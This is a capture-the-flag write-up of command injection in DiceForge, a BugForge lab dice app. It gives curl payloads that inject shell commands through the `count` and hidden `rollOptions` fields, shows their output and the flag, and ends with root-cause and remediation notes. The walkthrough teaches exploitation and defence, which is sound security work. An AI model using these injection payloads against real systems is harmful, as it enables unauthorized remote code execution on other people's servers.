---
title: DiceForge - Command Injection to RCE
tags:
  - bugforge
  - rce
  - command-injection
  - os-command-injection
  - express
  - nodejs
  - sandbox
aliases:
  - "/bugforge/diceforge-rce/"
  - "/BugForge/DiceForge---Command-Injection-to-RCE"
---
- DiceForge - a polished React dice-rolling app ("drag dice into the tray and roll") backed by a single Express API endpoint
- The only endpoint, `POST /api/roll`, builds a shell command from user-controlled request fields and reflects the command's output back in the JSON response
- The `dice[].type` field is whitelist-validated server-side (blocks injection), but `dice[].count` and the hidden `rollOptions` field are interpolated into the command unsanitized - two independent command-injection surfaces
- `rollOptions` is the sneaky one: the UI hardcodes it to `"none"` and never shows it, but the backend still passes it into the shell command
- A single `;` command separator turns a dice roll into full RCE as the `diceforge` user, and the flag is returned by `whoami` inside the restricted runtime

## Enumeration

Set the target:

```bash
TARGET="https://lab-1787217436405-tl028b.labs-app.bugforge.io"
```

### Application Fingerprinting

- Express.js SPA - `x-powered-by: express` on every response
- React frontend served as static assets; the JS source map is exposed and fully readable
- The frontend is a dice roller: drag dice types (`d4`, `d6`, `d8`, `d10`, `d12`, `d20`, `d100`) into a tray, hit Roll, and it POSTs to the backend
- No authentication, no sessions - the whole app is one endpoint

### Key Endpoints

| Method | Path | Auth | Notes |
|--------|------|------|-------|
| POST | /api/roll | none | **THE TARGET** - `{"dice":[{"type":"d6","count":2}],"rollOptions":"none"}` |
| GET | /health | none | Returns a small JSON payload |
| GET | / | none | SPA shell (index.html) |

Probing alternate prefixes confirms there is only one live API surface - `/v1/roll`, `/api/v1/roll`, and every method other than POST on `/api/roll` return the Express 404 (`Cannot GET /...`). No legacy namespace to worry about here.

### Reading the Frontend Source

The source map tells us exactly what the client sends. From `components/DiceRoller.js`, the roll request is:

```js
const response = await axios.post('/api/roll', {
  dice: dicePayload,          // [{ type: 'd6', count: 2 }, ...]
  rollOptions: 'none',        // <-- hardcoded, never shown in the UI
});
```

Two things stand out:
1. `dice[].type` comes from a fixed client-side whitelist (`DICE_CONFIG`)
2. `rollOptions` is **hardcoded to the string `"none"`** - the user never sees or controls it in the UI

The backend has to do something with `rollOptions`. If it is interpolated into a command, it is an injection surface the frontend hides from view.

## The Two Injection Surfaces

### Surface 1: `dice[].type` Is Whitelisted (Dead End)

Send a bogus type:

```bash
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"INVALID","count":1}]}'
```

```
HTTP/1.1 400 Bad Request
{"error":"Invalid dice type: INVALID"}
```

The server validates `type` against a whitelist. Command-injection attempts in `type` all bounce:

```bash
# all return 400 "Invalid dice type"
'd6;id'   'd6`id`'   'd6$(id)'
```

The whitelist check is server-side, so `type` is a dead end.

### Surface 2: `count` Is Not Validated

The `count` field is user-controlled and never validated. Send a normal roll to get a baseline:

```bash
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":2}],"rollOptions":"none"}'
```

```
HTTP/1.1 200 OK
{"notation":"2d6","results":[{"type":"d6","count":2,"rolls":[5,3],"subtotal":8}],"grandTotal":8,"timestamp":"..."}
```

Now inject a command separator into `count`:

```bash
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":"2;id"}]}'
```

```
HTTP/1.1 200 OK
{"notation":"2d6","results":[...],"grandTotal":7,"timestamp":"...","output":"uid=1000(diceforge) gid=1000(diceforge) groups=1000(diceforge)"}
```

There it is. The backend builds a shell command from `count`, runs it, and reflects the command's output in a new `output` field in the JSON response. The `;` breaks out of the intended command and `id` runs - **command injection confirmed**.

### Surface 3: `rollOptions` Is the Hidden One

The UI never shows `rollOptions` (it is hardcoded to `"none"`), but the backend interpolates it into the command just like `count`. The same injection works:

```bash
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":1}],"rollOptions":"none;id"}'
```

```
HTTP/1.1 200 OK
{"notation":"1d6","results":[...],"grandTotal":6,"timestamp":"...","output":"uid=1000(diceforge) gid=1000(diceforge) groups=1000(diceforge)"}
```

Both `count` and `rollOptions` give RCE. The lesson: **a leftover option the UI never exposes is often still on the wire - and still in the command.** Always fuzz every field the backend accepts, not just the ones the frontend renders.

## Step-by-Step Walkthrough

### 1. Set the target

```bash
TARGET="https://lab-1787217436405-tl028b.labs-app.bugforge.io"
```

### 2. Confirm command injection with a benign payload

Use a command that proves execution without side effects. `id` is ideal - it is safe and its output is distinctive:

```bash
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":"2;id"}]}'
```

Expected `output` field:

```
uid=1000(diceforge) gid=1000(diceforge) groups=1000(diceforge)
```

We are running as `diceforge` (uid 1000). The injection is live.

### 3. Map the runtime

The injected commands run inside a deliberately restricted runtime. Probe what is available:

```bash
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":"2;pwd;ls;whoami;uname -a"}]}'
```

```
/app
Dockerfile
node_modules
package.json
package-lock.json
src
bug{eCNKP8bYgDztFC6dMd4tw8Cnv7PBRVq5}
Linux diceforge-app-1 5.15.0-1035-aws #39-Ubuntu SMP Thu Nov 10 12:33:00 UTC 2022 x86_64 ...
```

Observations:
- The working directory is `/app` - the app's own directory
- `ls` lists the app tree (Dockerfile, node_modules, package.json, package-lock.json, src)
- **`whoami` returns the flag** - `bug{eCNKP8bYgDztFC6dMd4tw8Cnv7PBRVq5}`
- The runtime is heavily locked down: `find`, `env`, `echo`, `python3`, `node`, `/bin/ls`, `cd`, `type` are all "command not found", and `cat` returns "Permission denied" on everything including `/etc/passwd`, `/proc/1/environ`, and the app's own `package.json`

This is a sandboxed shell that exposes only a handful of commands (`ls`, `cat`, `id`, `pwd`, `whoami`, `uname`, `sh`). The flag is deliberately wired into the `whoami` command - the intended finish line of the challenge.

### 4. Retrieve the flag

A clean, single-purpose call:

```bash
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":"2;whoami"}]}'
```

```
HTTP/1.1 200 OK
{"notation":"2d6","results":[...],"grandTotal":7,"timestamp":"...","output":"bug{eCNKP8bYgDztFC6dMd4tw8Cnv7PBRVq5}"}
```

### 5. Submit the flag

```
bug{eCNKP8bYgDztFC6dMd4tw8Cnv7PBRVq5}
```

## TL;DR - Speedrun

```bash
TARGET="https://lab-1787217436405-tl028b.labs-app.bugforge.io"

# 1. Confirm RCE via the count field
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":"2;id"}]}'
# -> output: uid=1000(diceforge) ...

# 2. The hidden rollOptions field is a second, identical surface
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":1}],"rollOptions":"none;id"}'
# -> output: uid=1000(diceforge) ...

# 3. Grab the flag
curl -sk -X POST "$TARGET/api/roll" -H "Content-Type: application/json" \
  -d '{"dice":[{"type":"d6","count":"2;whoami"}]}'
# -> output: bug{eCNKP8bYgDztFC6dMd4tw8Cnv7PBRVq5}
```

## Why This Worked

### Bug: OS Command Injection in `POST /api/roll`

The backend takes `count` and `rollOptions` from the request body and interpolates them into a shell command without sanitization. The command's stdout/stderr is captured and returned to the client in the `output` field of the JSON response - which makes exploitation trivial, because the attacker gets direct command output readback instead of having to guess whether a payload ran.

The injection is a classic OS command injection:

- The attacker-controlled value is concatenated into a shell command string
- A command separator (`;`) terminates the intended command and starts a new one
- The injected command's output flows back to the attacker through the response

Because the app reflects command output, the impact is immediate and obvious: `id` proves execution, `whoami` returns the flag.

### Why the Whitelist on `type` Did Not Help

The developer correctly validated `dice[].type` against a whitelist - that is the field the UI exposes and the one that looks like the injection point. But the validation was applied to only one of several user-controlled fields. `count` and `rollOptions` were never validated, so the whitelist gave a false sense of security while the real injection surfaces stayed open.

### Why `rollOptions` Is the Sneaky Surface

The frontend hardcodes `rollOptions` to `"none"` and never renders it. A tester who only looks at the UI never sees it, and a developer who only tests what the UI sends may assume it is a fixed constant. But the backend still accepts an arbitrary value for it and passes it into the command. This is the "hidden parameter" class of bug: **the client controls more than the UI exposes, and the server trusts the client.**

### The Sandboxed Runtime

The injected commands run as `diceforge` in a deliberately restricted environment. Most tools (`find`, `env`, `python3`, `node`, `echo`) are absent and file reads are permission-denied, so the surface is narrow. The flag is served by `whoami` - a common CTF/lab pattern where the challenge's finish line is a single command rather than a file read. The restriction does not matter once you have RCE; you just need the one command that reveals the flag.

## Security Takeaways

### Vulnerability

- OS command injection (CWE-78) in `POST /api/roll`
- Two unsanitized, user-controlled fields - `dice[].count` and `rollOptions` - are interpolated into a shell command
- Command output is reflected back to the caller in the `output` field, giving full readback

### Impact

- Full remote code execution as the `diceforge` user
- Any command the user can run can be executed - file read, network, further enumeration
- The app reflects command output, so exploitation requires no blind techniques

### Root Cause

- User-controlled input (`count`, `rollOptions`) is concatenated into a shell command string with no sanitization
- Validation was applied to only one field (`type`) while sibling fields were left unvalidated
- A hidden field (`rollOptions`) that the UI never exposes is still accepted and processed by the backend
- The backend returns command output to the client, which turns a blind injection into a fully observable one

### Remediation

- **Never build shell commands from user input.** If a command must run, pass arguments as separate argv elements to `execFile`/`spawn` (no shell), or use a purpose-built library - never `exec`/`system` with string interpolation.
- **Validate every field the backend accepts, not just the ones the UI renders.** Treat every request body key as untrusted. A whitelist on `type` does nothing if `count` and `rollOptions` are still interpolated.
- **Do not reflect command output to the client.** If a command must run, log its output server-side and return only a success/failure status. Reflecting stdout/stderr turns any injection into a trivial, fully-observable RCE.
- **Reject unexpected fields.** If `rollOptions` is meant to be a fixed constant, ignore or reject any value other than the allowed set rather than passing it through.
- **Run the app with the least privilege and a read-only filesystem** so that even an RCE has a narrow blast radius.
